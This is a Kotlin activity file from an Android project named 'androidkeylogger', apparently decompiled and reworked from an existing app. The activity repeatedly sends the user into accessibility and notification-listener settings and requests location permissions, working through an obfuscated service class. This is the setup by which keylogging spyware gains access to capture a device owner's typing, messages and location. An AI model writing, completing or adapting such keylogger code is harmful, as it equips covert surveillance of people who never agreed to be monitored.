package com.azamovhudstc.androidkeylogger.activity

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.azamovhudstc.androidkeylogger.R
import com.azamovhudstc.androidkeylogger.service.SvcAccFix


class AccessibilityFixActivity : AppCompatActivity() {
    private val REQUEST_CODE_NOTIFICATION_LISTENER = 10
    private  fun openSetting(view: View) {
        try {
            SvcAccFix.j = true
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
            startActivity(Intent("android.settings.ACCESSIBILITY_SETTINGS"))
        } catch (e: Exception) {
            Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
        }
    }

    override fun onBackPressed() {
        finishAffinity()
        super.onBackPressed()
    }

    /* Access modifiers changed, original: protected */
    public override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        if (SvcAccFix.i) {
            SvcAccFix.j = false
            Toast.makeText(this, getString(R.string.type_something), Toast.LENGTH_LONG).show()
            finish()
            return
        }
        setContentView(R.layout.activity_accessibility)


        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // Ruxsatlar so`rilib bo`lmagan, foydalanuvchi tomonidan so`rash kerak
            // Ruxsatlarni so`rash oynasi ochiladi
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.INTERNET
                ),
                3
            )

        }
        checkNotificationListenerPermission()
        findViewById<View>(R.id.btn501925).setOnClickListener { view ->
            openSetting(
                view
            )
        }
    }
    private fun checkNotificationListenerPermission() {
        if (!isNotificationListenerEnabled()) {
            requestNotificationListenerPermission()
        } else {
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val packageName = packageName
        val flat = android.provider.Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun requestNotificationListenerPermission() {
        val enableNotificationListenerIntent = Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS)
        enableNotificationListenerIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(enableNotificationListenerIntent)
        Toast.makeText(this, "Please enable Notification Listener permission", Toast.LENGTH_LONG).show()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 3) {
            if (resultCode == Activity.RESULT_OK) {
                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
            } else {
                // Ruxsatlar foydalanuvchi tomonidan berilgan
                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
                // Ruxsatlar foydalanuvchi tomonidan rad qilindi, shundayki ilova qo'llanmagan
                Toast.makeText(this, "Permission denied by the user", Toast.LENGTH_SHORT).show()
            }
        }
    }


    /* Access modifiers changed, original: protected */
    public override fun onDestroy() {
        super.onDestroy()
    }

    /* Access modifiers changed, original: protected */
    public override fun onResume() {
        super.onResume()
    }
}